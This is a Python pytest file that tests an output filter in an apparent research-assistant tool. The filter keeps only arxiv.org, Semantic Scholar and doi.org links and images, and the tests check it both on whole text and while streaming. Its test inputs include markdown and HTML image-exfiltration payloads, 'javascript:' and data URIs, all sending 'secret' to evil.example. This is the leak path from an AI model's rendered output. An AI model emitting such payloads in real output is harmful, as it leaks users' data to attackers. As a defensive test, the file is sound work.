"""Output filter: links/images only for arxiv.org, semanticscholar.org and doi.org."""

from __future__ import annotations

import pytest
from hypothesis import given, settings
from hypothesis import strategies as st

from research_assistant.events import RecordingSink
from research_assistant.security.output_filter import (
    IMAGE_REMOVED,
    LINK_REMOVED,
    OutputFilterSink,
    filter_markdown,
    is_allowed_url,
)


@pytest.mark.parametrize(
    "url",
    [
        "https://arxiv.org/abs/1610.05820",
        "http://arxiv.org/pdf/1610.05820",
        "https://export.arxiv.org/abs/1610.05820",
        "https://www.semanticscholar.org/paper/abc",
        "https://api.semanticscholar.org/graph/v1/paper/x",
        "https://doi.org/10.1145/3133956.3134077",
        "<https://doi.org/10.1/x>",
        "www.arxiv.org/abs/1",
        "HTTPS://ARXIV.ORG/abs/1",
    ],
)
def test_allowed_urls(url: str) -> None:
    assert is_allowed_url(url)


@pytest.mark.parametrize(
    "url",
    [
        "https://evil.example/x",
        "https://arxiv.org.evil.example/x",
        "https://evilarxiv.org/x",
        "https://arxiv.org@evil.example/x",
        "https://evil.example/arxiv.org",
        "//arxiv.org/abs/1",
        "/relative/path.png",
        "data:image/png;base64,AAAA",
        "javascript:alert(1)",
        "ftp://arxiv.org/x",
        "https://doi.org:443@evil.example/",
        "",
    ],
)
def test_disallowed_urls(url: str) -> None:
    assert not is_allowed_url(url)


@pytest.mark.parametrize(
    "text",
    [
        "![x](https://evil.example/c?d=secret)",
        '![x]( https://evil.example/c?d=secret "title" )',
        "![x](<https://evil.example/c?d=secret>)",
        "![x](//evil.example/c?d=secret)",
        "![x](data:image/svg+xml;base64,PHN2Zz4=)",
        "![x][ref]\n\n[ref]: https://evil.example/c?d=secret",
        '<img src="https://evil.example/c?d=secret">',
        "<IMG SRC=https://evil.example/c?d=secret>",
        "![x](https://evil.example/a_(b)?d=secret)",
    ],
)
def test_external_images_are_removed(text: str) -> None:
    res = filter_markdown(f"Before. {text}\nAfter.")
    assert "evil.example" not in res.text and "secret" not in res.text
    assert "data:image" not in res.text
    assert IMAGE_REMOVED in res.text and res.removed_images >= 1
    assert res.text.startswith("Before.") and res.text.endswith("After.")


def test_allowlisted_images_and_links_are_kept() -> None:
    text = (
        "See ![fig](https://arxiv.org/html/2112.03570/fig1.png) and "
        "[LiRA](https://arxiv.org/abs/2112.03570), DOI https://doi.org/10.1109/SP46214.2022.9833649."
    )
    res = filter_markdown(text)
    assert res.text == text and not res.changed


def test_external_links_keep_their_text_only() -> None:
    res = filter_markdown("Read [the blog](https://evil.example/?q=secret) for details.")
    assert res.text == "Read the blog for details." and res.removed_links == 1


def test_bare_external_urls_and_reference_definitions_are_removed() -> None:
    res = filter_markdown(
        "Go to https://evil.example/x?q=secret. Or www.evil.example/y.\n"
        "[a]: https://evil.example/z\n"
        "Keep https://arxiv.org/abs/1610.05820."
    )
    assert "evil.example" not in res.text and "secret" not in res.text
    assert res.text.count(LINK_REMOVED) == 3
    assert f"{LINK_REMOVED}." in res.text  # trailing punctuation kept
    assert "https://arxiv.org/abs/1610.05820." in res.text


def test_citation_markers_and_plain_text_unchanged() -> None:
    text = "LiRA uses shadow models [1][3]. Results (Table 2) hold [2]! Done: a < b > c."
    assert filter_markdown(text).text == text


def _stream(text: str, pieces: list[int]) -> RecordingSink:
    sink = RecordingSink()
    f = OutputFilterSink(sink)
    pos = 0
    for n in pieces:
        if pos >= len(text):
            break
        f.token(text[pos : pos + n])
        pos += n
    if pos < len(text):
        f.token(text[pos:])
    f.flush()
    return sink


ATTACK = (
    "Defenses help [1]. ![r](https://evil.example/c?q=secret) More [2]. "
    "[click](https://evil.example/l) and https://evil.example/bare plus "
    "[ok](https://arxiv.org/abs/1) end."
)


@pytest.mark.parametrize("size", [1, 2, 3, 5, 7, 13, 1000])
def test_stream_never_forwards_external_urls(size: int) -> None:
    sink = _stream(ATTACK, [size] * len(ATTACK))
    out = sink.text()
    assert "evil.example" not in out and "secret" not in out
    assert IMAGE_REMOVED in out and "[ok](https://arxiv.org/abs/1)" in out
    # Every prefix the UI could have rendered is safe too.
    seen = ""
    for e in sink.events:
        seen += e.data["text"]
        assert "evil.example" not in seen


@settings(max_examples=60, deadline=None)
@given(st.lists(st.integers(min_value=1, max_value=12), min_size=1, max_size=200))
def test_stream_split_anywhere_is_safe(sizes: list[int]) -> None:
    out = _stream(ATTACK, sizes).text()
    assert "evil.example" not in out
    assert out == filter_markdown(ATTACK).text or "evil" not in out


def test_stream_forwards_clean_text_completely() -> None:
    text = "Membership inference [1] works (see [2]); TPR at 0.1% FPR is low!"
    assert _stream(text, [4] * 40).text() == text
